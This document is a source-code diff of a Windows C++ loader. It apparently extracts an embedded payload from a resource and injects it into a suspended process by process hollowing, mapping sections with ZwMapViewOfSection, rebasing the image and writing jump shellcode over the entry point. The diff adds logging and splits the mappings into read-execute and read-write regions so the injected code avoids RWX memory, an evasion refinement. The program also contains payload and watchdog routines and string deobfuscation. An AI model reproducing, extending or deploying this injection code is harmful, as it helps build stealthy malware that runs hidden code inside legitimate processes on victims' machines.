@@ -17,6 +17,7 @@
 
 #ifdef _DBG
 #pragma comment(lib, "Shell32.lib")		
+#define MAPPING_TRACKING 0x10
 #endif
 
 //FILE * debug_file_handle = stdout;
@@ -87,7 +88,7 @@ bool GetResourceImageBuffer(DWORD resID, char **ImgResData, DWORD *sourceImgSize
 	hRes = FindResource(dll_handle, MAKEINTRESOURCE(resID) ,"JLR");
 	if( hRes == nullptr ) { 
 #ifdef _DBG
-		Log("Unable to find resource.\r\n");
+		Log("[-] Unable to find resource.\r\n");
 #endif
 		return false;
 	}
@@ -95,7 +96,7 @@ bool GetResourceImageBuffer(DWORD resID, char **ImgResData, DWORD *sourceImgSize
     hResourceLoaded = LoadResource(dll_handle, hRes);
 	if( hResourceLoaded == nullptr ) {
 #ifdef _DBG
-		Log("Unable to load resource.\r\n");
+		Log("[-] Unable to load resource.\r\n");
 #endif
 		return false;
 	}
@@ -103,14 +104,14 @@ bool GetResourceImageBuffer(DWORD resID, char **ImgResData, DWORD *sourceImgSize
     *ImgResData = (char *)LockResource(hResourceLoaded);
 	if( hResourceLoaded == nullptr ) {
 #ifdef _DBG
-			Log("Unable to lock resource.\r\n");
+			Log("[-] Unable to lock resource.\r\n");
 #endif
 		return false;
 	}
 
     *sourceImgSize = SizeofResource(dll_handle, hRes);
 #ifdef _DBG
-	Log("file size %d\n", *sourceImgSize);
+	Log("[+] File size %d\n", *sourceImgSize);
 #endif
 
 	return true;
@@ -123,9 +124,9 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	
 #ifdef _DBG
 	if( curDir != nullptr)
-		Log("Creating process with current dir: %s\r\n", curDir);
+		Log("[+] Creating process with current dir: %s\r\n", curDir);
 	else
-		Log("Creating process\r\n");
+		Log("[+] Creating process\r\n");
 #endif
 
 	//Start the target process suspended
@@ -214,27 +215,48 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
 
 	PVOID BaseAddress = (PVOID)0;
-	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
+	DWORD perms = PAGE_READWRITE;
+	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, perms)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
 		Log( "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
 		return 0;
-	}	
+	} else {
+#ifdef _DBG
+		Log( MAPPING_TRACKING, "[-] Mapped View of Section %d with permissions %x at 0x%p in process %d\n", image_sect, perms, BaseAddress, pProcessInfo->hProcess);
+#endif
+	}
 
 	//Unmap the test location
-	ZwUnmapViewOfSection(pProcessInfo->hProcess, BaseAddress);
+	if ((stat = ZwUnmapViewOfSection(pProcessInfo->hProcess, BaseAddress)) != STATUS_SUCCESS)
+	{
+#ifdef _DBG
+		Log("[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
+#endif
+		return 0;
+	} else {
+#ifdef _DBG
+		Log( MAPPING_TRACKING, "[+] Unmapped View of Section at 0x%p in process %d\n", BaseAddress, pProcessInfo->hProcess);
+#endif
+	}
+
 	PVOID RemoteAddress = BaseAddress;
 
 	//Set size
 	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
 	BaseAddress = (PVOID)0;
-	if ((stat = ZwMapViewOfSection(image_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
+	perms = PAGE_READWRITE;
+	if ((stat = ZwMapViewOfSection(image_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, perms)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
 		Log( "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
 		return 0;
+	} else {
+#ifdef _DBG
+		Log(MAPPING_TRACKING, "[+] Mapped View of Section %d with size %x with permissions %x at 0x%p in process %d\n", image_sect, size, perms, BaseAddress, GetCurrentProcess());
+#endif
 	}	
 		
 	#ifdef _M_IX86
@@ -257,7 +279,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	
 	//Image entry
 #ifdef _DBG
-	Log( "Loaded image entry point: 0x%x\n", pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint);
+	Log( "[+] Loaded image entry point: 0x%x\n", pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint);
 #endif 
 
 	//Base before
@@ -265,7 +287,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	memcpy(&before, (PVOID)((size_t)BaseAddress + image_base), sizeof(before)); 
 	
 #ifdef _DBG
-	Log("Base before: %p\n", before);
+	Log("[+] Base before: %p\n", before);
 #endif 
 
 
@@ -273,29 +295,147 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	memcpy((PVOID)((size_t)BaseAddress + image_base), &RemoteAddress, sizeof(RemoteAddress)); 
 
 	//Copy each section of the replacement binary
+	size_t first_write_addr = 0;
+	size_t text_sec_end_addr = 0;
 	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
 	{
 		if (!pSourceImage->Sections[x].PointerToRawData)
 			continue;
 
 		PVOID pSectionDestination = (PVOID)((size_t)BaseAddress + pSourceImage->Sections[x].VirtualAddress);
+		DWORD mem_perms = 0x0;
+		DWORD image_perms = pSourceImage->Sections[x].Characteristics >> 24;
+		
+		if (image_perms == 0x60) {
+			text_sec_end_addr = (size_t)RemoteAddress + pSourceImage->Sections[x].VirtualAddress;
+			text_sec_end_addr += pSourceImage->Sections[x].SizeOfRawData;
+			text_sec_end_addr += 0x10000 - (text_sec_end_addr % 0x10000);
+			Log("[-] End of Text Section: %p.\n", text_sec_end_addr);
+		} else if (image_perms & 0x80) {
+			first_write_addr = (size_t)RemoteAddress + pSourceImage->Sections[x].VirtualAddress;
+			first_write_addr -= (first_write_addr % 0x10000);
+			Log("[-] Start of Writable Data Section: %p.\n", first_write_addr);
+		}
+		
+
+		if (image_perms == 0x60)
+			mem_perms = PAGE_EXECUTE_READ;
+		else if (image_perms == 0xc0)
+			mem_perms = PAGE_READWRITE;
+		else if (image_perms & 0x40)
+			mem_perms = PAGE_READONLY;
 
 		#ifdef _DBG
-			Log("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
+			size_t name_size = sizeof(pSourceImage->Sections[x].Name);
+			char *sectionName = (char *)calloc(name_size+1, 1);
+			if (sectionName) {
+
+				memcpy(sectionName, pSourceImage->Sections[x].Name, name_size);
+				Log("[+] Writing %s section to 0x%p to 0x%p\r\n", sectionName, pSectionDestination, (PVOID)((size_t)pSectionDestination + pSourceImage->Sections[x].SizeOfRawData));
+				free(sectionName);
+				Log("[+] Permissions: %d\n\n", mem_perms);
+				
+			}
 		#endif
 
 		memcpy( pSectionDestination, &ImgData[pSourceImage->Sections[x].PointerToRawData],
 			pSourceImage->Sections[x].SizeOfRawData);
+
 	}	
+
+	//Check that the executable text section was found
+	if ( text_sec_end_addr == 0) {
+#ifdef _DBG
+		Log("[-] Unable to locate executable section of the binary. Exiting.\n");
+#endif
+		return 0;
+	}
+
+	//Check if a writable section was found
+	if (first_write_addr != 0 ){
+		
+		if (first_write_addr > text_sec_end_addr) {
+			size_t memory_diff = first_write_addr - text_sec_end_addr;
+#ifdef _DBG
+			Log("[+] Difference from RW Memory to RX Text Section: %p.\n", memory_diff);
+#endif
+			if (memory_diff < 0x10000) {
+#ifdef _DBG
+				Log("[-] Unable to split the sections on 64k byte boundaries. Resulting memory mapping will have to be RWX.\n");
+#endif
+				return 0;
+			} else {
+
+				//Map the first chunk as read executable
+				perms = PAGE_EXECUTE_READ;
+				size = text_sec_end_addr - (size_t)RemoteAddress;
+				if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &RemoteAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, perms)) != STATUS_SUCCESS)
+				{
+#ifdef _DBG
+					Log("[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
+					Log("[+] Mapped View of Section %d with size %x with permissions %x at 0x%p in process %d\n", image_sect, size, perms, RemoteAddress, pProcessInfo->hProcess);
+
+#endif
+					return 0;
+				}
+				else {
+#ifdef _DBG
+					Log(MAPPING_TRACKING, "[+] Mapped View of Section %d with size %x with permissions %x at 0x%p in process %d\n", image_sect, size, perms, RemoteAddress, pProcessInfo->hProcess);
+#endif
+				}
+
+				//Map the second chunk as read write
+				perms = PAGE_READWRITE;
+				size_t rem_size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage - size;
+				LARGE_INTEGER offset;
+				offset.QuadPart = size;
+				PVOID dst_addr = (PVOID)((size_t)RemoteAddress + size);
+				if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &dst_addr, NULL, NULL, &offset, &rem_size, 1 /* ViewShare */, NULL, perms)) != STATUS_SUCCESS)
+				{
+#ifdef _DBG
+					Log("[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
+					Log("[+] Mapped View of Section %d with size %x with permissions %x at 0x%p in process %d\n", image_sect, rem_size, perms, dst_addr, pProcessInfo->hProcess);
+
+#endif
+					return 0;
+				}
+				else {
+#ifdef _DBG
+					Log(MAPPING_TRACKING, "[+] Mapped View of Section %d with size %x with permissions %x at 0x%p in process %d\n", image_sect, rem_size, perms, dst_addr, pProcessInfo->hProcess);
+#endif
+				}
+
+			}
+
+		} else {
+#ifdef _DBG
+			Log("[-] Writable section located before executable section. Exiting.\n");
+#endif
+			return 0;
+		}
+	}else {
+		
+		//Map the whole thing READ EXECUTE
+		perms = PAGE_EXECUTE_READ;
+		size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
+		if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &RemoteAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, perms)) != STATUS_SUCCESS)
+		{
+	#ifdef _DBG
+			Log( "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
+	#endif
+			return 0;
+		} else {
+	#ifdef _DBG
+			Log(MAPPING_TRACKING, "[+] Mapped View of Section %d with size %x with permissions %x at 0x%p in process %d\n", image_sect, size, perms, RemoteAddress, pProcessInfo->hProcess);
+	#endif
+		} 
+	}
+	
 
 
 #ifdef _DBG
-	Log(
-			"Source image base: 0x%p\r\n"
-			"Destination image base: 0x%p\r\n",
-			pSourceImage->FileHeader->OptionalHeader.ImageBase,
-			RemoteAddress
-	);
+	Log("[+] Source image base: 0x%p\r\n", pSourceImage->FileHeader->OptionalHeader.ImageBase );
+	Log("[+] Destination image base: 0x%p\r\n", RemoteAddress);
 #endif
 
 	//Get the difference between the new destination memory address and the image base
@@ -310,8 +450,8 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	
 
 	#ifdef _DBG
-		Log("Relocation delta: 0x%p\r\n", dwDelta);
-		Log("Writing headers\r\n");
+		Log("[+] Relocation delta: 0x%p\r\n", dwDelta);
+		Log("[+] Writing headers\r\n");
 	#endif
 
     // Rebase image if necessary, x86 and x64
@@ -325,7 +465,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 				continue;
 
 			#ifdef _DBG
-				Log("Rebasing image\r\n");
+				Log("[+] Rebasing image\r\n");
 			#endif
 
 			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
@@ -373,20 +513,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 		}
 
 	}
-
-	////Load any dll import needed by the program
-	//LoadDllImports( BaseAddress );
-
-	//Map the orginial over our data
-	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
-	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &RemoteAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
-	{
-#ifdef _DBG
-		Log( "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
-#endif
-		return 0;
-	}
-
+	
 
 //*************************************************************************************************
 
@@ -403,15 +530,20 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 
 	//Set size
 	BaseAddress = (PVOID)0;
-	if ((stat = ZwMapViewOfSection(entry_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
+	perms = PAGE_READWRITE;
+	if ((stat = ZwMapViewOfSection(entry_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, perms)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
 		Log("[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
 		return 0;
-	}	
+	} else {
+		#ifdef _DBG
+		 Log(MAPPING_TRACKING, "[+] Mapped View of Section %d with permissions %x at 0x%p in process %d\n", entry_sect, perms, BaseAddress,  GetCurrentProcess());
+		#endif
+	}
 	
-	//Entrypoint addr
+	//Entry point addr
 	size_t entr_addr = (size_t)RemoteAddress + pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint;
 	DWORD counter = 0;	
 	unsigned int sc_size = 0x50;
@@ -498,18 +630,35 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	//copy the binary to the mapped buffer
 	memcpy((BYTE*)read_proc + rem_entry_pt, jmpshellcode, sizeof(jmpshellcode));
 	memcpy(BaseAddress, read_proc, image_size);
+
+	//Set base address
 	BaseAddress = (PVOID)ImageBase;
-
-	//Unmap the orginal image
-	ZwUnmapViewOfSection(pProcessInfo->hProcess, BaseAddress);
-
-	//Map the orginial over our data
-	if ((stat = ZwMapViewOfSection(entry_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
+	
+	//Unmap the orginal PEB
+	if ((stat = ZwUnmapViewOfSection(pProcessInfo->hProcess, BaseAddress)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
 		Log("[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
 		return 0;
+	} else {
+#ifdef _DBG
+		Log(MAPPING_TRACKING, "[+] Unmapped View of Section at 0x%p in process %d\n", BaseAddress, pProcessInfo->hProcess);
+#endif
+	}
+
+	//Map the custom shellcode & PEB to remote process
+	perms = PAGE_EXECUTE_READ;
+	if ((stat = ZwMapViewOfSection(entry_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, perms)) != STATUS_SUCCESS)
+	{
+#ifdef _DBG
+		Log("[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
+#endif
+		return 0;
+	} else {
+#ifdef _DBG
+		Log(MAPPING_TRACKING, "[+] Mapped View of Section %d with permissions %x at 0x%p in process %d\n", entry_sect, perms, BaseAddress, pProcessInfo->hProcess);
+#endif
 	}
 
 	//*********************
@@ -526,8 +675,14 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	//Resume execution
 	ResumeThread(pProcessInfo->hThread);
 	//system("pause");
+	
+	DWORD procPid = pProcessInfo->dwProcessId;
 
-	return pProcessInfo->dwProcessId;
+	//Close handle to sections
+	CloseHandle(entry_sect);
+	CloseHandle(image_sect);
+
+	return procPid;
 
 }
 
@@ -542,6 +697,7 @@ int main(int argc, char* argv[]){
 		std::string str_path(path);
 		str_path.append("\\payld.log");
 		SetLogPath(str_path.c_str());
+		//SetLogLevel(MAPPING_TRACKING);
 	}
 #endif
 		LoadPayload();
@@ -555,6 +711,7 @@ int main(int argc, char* argv[]){
 		std::string str_path(path);
 		str_path.append("\\wdg.log");
 		SetLogPath(str_path.c_str());
+		//SetLogLevel(MAPPING_TRACKING);
 	}
 #endif
 		LoadWatchDog();
@@ -601,7 +758,7 @@ void LoadWatchDog() {
 		//Deobfuscate it
 		curDirPtr = decode_split(cur_dir, 400);
 #ifdef _DBG
-		Log("Current dir: %s\r\n", curDirPtr);
+		Log("[+] Current dir: %s\r\n", curDirPtr);
 #endif
 	}
 	
